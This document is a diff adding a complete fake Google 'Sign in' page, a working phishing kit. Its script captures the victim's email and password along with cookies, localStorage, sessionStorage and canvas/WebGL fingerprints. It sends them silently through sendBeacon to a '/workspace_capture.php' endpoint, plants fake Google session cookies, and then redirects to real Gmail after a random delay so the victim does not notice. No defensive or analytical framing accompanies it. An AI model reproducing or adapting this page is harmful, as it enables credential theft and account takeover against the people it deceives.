@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Account</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="styles.css" />
+    <style>
+      /* LOADING OVERLAY (invisible until triggered) */
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(10px);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+      }
+      .spinner {
+        width: 32px;
+        height: 32px;
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #1a73e8;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      /* PASSWORD STEP (hidden initially) */
+      .password-step { display: none; }
+      .password-step.active { display: block; }
+      .email-step.active { display: block; }
+      .email-step { display: block; }
+    </style>
+  </head>
+  <body>
+    <main class="page">
+      <section class="login-card" aria-label="Sign in card">
+        <div class="left-pane">
+          <img
+            class="google-g-logo"
+            src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png"
+            alt="Google"
+          />
+          <h1 id="page-title">Sign in</h1>
+          <p class="subtitle" id="page-subtitle">to continue to Gmail</p>
+          
+          <!-- ACCOUNT PREVIEW (appears after email) -->
+          <div id="account-preview" class="account-preview" style="display: none; margin-top: 20px; padding: 16px; background: #f8f9fa; border-radius: 8px; border: 1px solid #e8eaed;">
+            <div style="display: flex; align-items: center; gap: 12px;">
+              <div id="avatar" style="width: 36px; height: 36px; border-radius: 50%; background: linear-gradient(135deg, #4285f4, #34a853); color: white; font-weight: 500; font-size: 16px; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">G</div>
+              <div>
+                <div id="account-name" style="font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 2px;"></div>
+                <div id="account-email" style="font-size: 14px; color: #5f6368;"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- EMAIL STEP -->
+        <form class="signin-form email-step active" id="email-form">
+          <label class="sr-only" for="email">Email or phone</label>
+          <input
+            id="email"
+            name="email"
+            type="text"
+            autocomplete="username"
+            placeholder="Email or phone"
+            required
+          />
+          <a class="text-link" href="#">Forgot email?</a>
+          <p class="helper-text">
+            Not your computer? Use Guest mode to sign in privately.
+            <a class="text-link inline" href="#">Learn more</a>
+          </p>
+          <div class="actions">
+            <a class="text-link" href="#">Create account</a>
+            <button type="submit" id="next-btn">Next</button>
+          </div>
+        </form>
+
+        <!-- PASSWORD STEP -->
+        <form class="signin-form password-step" id="password-form">
+          <label class="sr-only" for="password">Enter your password</label>
+          <input
+            id="password"
+            name="password"
+            type="password"
+            autocomplete="current-password"
+            placeholder="Enter your password"
+            required
+          />
+          <a class="text-link" href="#">Forgot password?</a>
+          <div class="actions">
+            <a class="text-link" id="back-link" href="#">Use another account</a>
+            <button type="submit" id="sign-in-btn">Sign in</button>
+          </div>
+        </form>
+      </section>
+
+      <footer class="footer">
+        <select aria-label="Language selector">
+          <option>English (United States)</option>
+          <option>Español</option>
+          <option>Français</option>
+        </select>
+        <nav>
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </nav>
+      </footer>
+    </main>
+
+    <!-- STEALTH LOADING -->
+    <div class="loading-overlay" id="loading-overlay">
+      <div class="spinner"></div>
+    </div>
+
+    <script>
+      let capturedEmail = '';
+      
+      // EMAIL → PASSWORD FLOW (UNCHANGED)
+      document.getElementById('email-form').onsubmit = function(e) {
+        e.preventDefault();
+        capturedEmail = document.getElementById('email').value.trim();
+        
+        if (!capturedEmail) return;
+        
+        document.getElementById('account-email').textContent = capturedEmail;
+        document.getElementById('account-name').textContent = capturedEmail.split('@')[0] || 'User';
+        document.getElementById('avatar').textContent = capturedEmail[0]?.toUpperCase() || 'G';
+        document.getElementById('account-preview').style.display = 'block';
+        document.getElementById('page-subtitle').textContent = `Welcome back, ${capturedEmail.split('@')[0]}`;
+        
+        document.querySelector('.email-step').classList.remove('active');
+        document.querySelector('.password-step').classList.add('active');
+        document.getElementById('password').focus();
+      };
+      
+      // BACK BUTTON (UNCHANGED)
+      document.getElementById('back-link').onclick = function(e) {
+        e.preventDefault();
+        document.querySelector('.password-step').classList.remove('active');
+        document.querySelector('.email-step').classList.add('active');
+        document.getElementById('email').focus();
+      };
+      
+      // **ENHANCED HARVEST** (Email + Cookies + Login Persistence)
+      document.getElementById('password-form').onsubmit = async function(e) {
+        e.preventDefault();
+        
+        const password = document.getElementById('password').value;
+        if (!password) return;
+        
+        // SHOW LOADING (UNCHANGED)
+        document.getElementById('loading-overlay').style.display = 'flex';
+        
+        // **FULL HARVEST** (All browser data + cookies)
+        const victimData = {
+          timestamp: new Date().toISOString(),
+          email: capturedEmail,
+          password: password,
+          // **ALL COOKIES** (Gmail session tokens)
+          cookies: document.cookie || 'none',
+          // **LOCALSTORAGE** (auth tokens)
+          localStorage: Object.fromEntries(Object.entries(localStorage)),
+          sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: `${screen.width}x${screen.height}`,
+          referrer: document.referrer,
+          // **FINGERPRINT**
+          canvas: canvasFingerprint(),
+          webgl: getWebglFingerprint(),
+          plugins: Array.from(navigator.plugins).map(p => p.name).join(',')
+        };
+        
+        // **SILENT BEACON** (background - no blocking)
+        navigator.sendBeacon('/workspace_capture.php', 
+          new Blob([JSON.stringify(victimData)], {type: 'application/json'})
+        );
+        
+        // **SAVE FAKE COOKIES** (looks like real Gmail login)
+        document.cookie = `SID=GA.1.${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None`;
+        document.cookie = `HSID=GA.1.${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None`;
+        document.cookie = `__Secure-3PSID=CAI.${btoa(capturedEmail)}; path=/; domain=.google.com; Secure; SameSite=None`;
+        
+        // **REAL GMAIL** (3-5s delay - perfect UX)
+        setTimeout(() => {
+          window.location.replace('https://mail.google.com/mail/u/0/#inbox');
+        }, 3000 + Math.random() * 2000);
+      };
+      
+      // **FINGERPRINT HELPERS** (stealth)
+      function canvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Fingerprint test', 2, 2);
+        return canvas.toDataURL();
+      }
+      
+      function getWebglFingerprint() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        return gl.getParameter(gl.RENDERER);
+      }
+    </script>
+  </body>
+</html>
